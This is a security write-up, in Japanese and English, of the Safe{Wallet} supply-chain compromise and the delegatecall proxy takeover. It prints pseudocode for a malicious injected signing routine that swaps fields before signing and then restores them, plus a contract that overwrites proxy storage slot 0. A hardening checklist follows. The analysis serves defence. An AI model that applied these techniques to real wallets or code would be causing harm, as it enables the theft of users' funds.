# Web3 署名ワークフローの侵害 & Safe delegatecall proxy takeover

{{#include ../../banners/hacktricks-training.md}}

## 概要

この cold-wallet theft chain は、**supply-chain compromise of the Safe{Wallet} web UI** と **on-chain delegatecall primitive that overwrote a proxy’s implementation pointer (slot 0)** を組み合わせたものです。主なポイントは次のとおりです:

- dApp が signing path にコードを注入できる場合、signer に攻撃者が選んだフィールドに対する有効な **EIP-712 signature over attacker-chosen fields** を生成させつつ、元の UI データを復元して他の signers が気づかないようにできます。
- Safe proxies は `masterCopy` (implementation) を **storage slot 0** に格納します。slot 0 に書き込む contract への delegatecall は実質的に Safe を攻撃者ロジックに“upgrades”し、ウォレットの完全な制御をもたらします。

## Off-chain: Targeted signing mutation in Safe{Wallet}

改ざんされた Safe bundle (`_app-*.js`) は特定の Safe と signer addresses を選択的に攻撃しました。注入されたロジックは signing call の直前に実行されました:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Attack properties
- **Context-gated**: 被害者の Safes/signers に対するハードコーディングされた allowlists はノイズを抑え、検出を低減させた。
- **Last-moment mutation**: フィールド (`to`, `data`, `operation`, gas) は `signTransaction` の直前に上書きされ、その後元に戻されたため、UI 上の提案ペイロードは無害に見える一方で署名は攻撃者のペイロードと一致していた。
- **EIP-712 opacity**: wallets は構造化データを表示したが、ネストした calldata をデコードせず、`operation = delegatecall` を強調表示しなかったため、変異されたメッセージは事実上ブラインド署名された。

### Gateway validation relevance
Safe proposals are submitted to the **Safe Client Gateway**. ハード化されたチェックが導入される前は、UI が署名後にフィールドを書き換えた場合、`safeTxHash`/署名が JSON 本文のフィールドと異なるものに対応していても、ゲートウェイは提案を受け入れてしまう可能性があった。インシデント後、ゲートウェイはハッシュ/署名が送信されたトランザクションと一致しない提案を拒否するようになった。同様のサーバー側ハッシュ検証は、あらゆる signing-orchestration API に対して実施されるべきである。

## On-chain: Delegatecall proxy takeover via slot collision

Safe proxies keep `masterCopy` at **storage slot 0** and delegate all logic to it. Safe が **`operation = 1` (delegatecall)** をサポートしているため、任意の署名済みトランザクションは任意のコントラクトを指し、プロキシのストレージコンテキストでそのコードを実行できる。

An attacker contract mimicked an ERC-20 `transfer(address,uint256)` but instead wrote `_to` into slot 0:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Execution path:
1. 被害者は `execTransaction` に署名する（`operation = delegatecall`、`to = attackerContract`、`data = transfer(newImpl, 0)`）。
2. Safe masterCopy はこれらのパラメータ上の署名を検証する。
3. Proxy が `attackerContract` に delegatecall を実行する；`transfer` 本体が slot 0 に書き込む。
4. Slot 0 (`masterCopy`) は攻撃者制御のロジックを指すようになり → **ウォレットの完全乗っ取りと資金流出**。

## 検出とハードニングチェックリスト

- **UI整合性**: JSアセットをピン留め / SRI を利用；バンドル差分を監視；署名用UIを信頼境界の一部として扱う。
- **署名時検証**: ハードウェアウォレットと **EIP-712 clear-signing** を使用；`operation` を明示的に表示し、ネストされた calldata をデコードする。ポリシーで許可されない限り `operation = 1` の署名は拒否する。
- **サーバー側ハッシュチェック**: 提案を中継するゲートウェイ/サービスは `safeTxHash` を再計算し、署名が送信されたフィールドと一致するか検証するべき。
- **ポリシー/許可リスト**: `to`、selector、資産タイプ向けの事前チェックルールを設け、検証済みのフロー以外では delegatecall を禁止する。完全に署名済みトランザクションをブロードキャストする前に内部のポリシーサービスを要求する。
- **コントラクト設計**: 必要不可欠な場合を除き、multisig/treasury ウォレットで任意の delegatecall を公開しない。アップグレードポインタを slot 0 から離すか、明示的なアップグレードロジックとアクセス制御で保護する。
- **監視**: treasury 資金を保有するウォレットからの delegatecall 実行をアラートし、典型的な `call` パターンから `operation` を変更する提案にもアラートを出す。

## References

- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
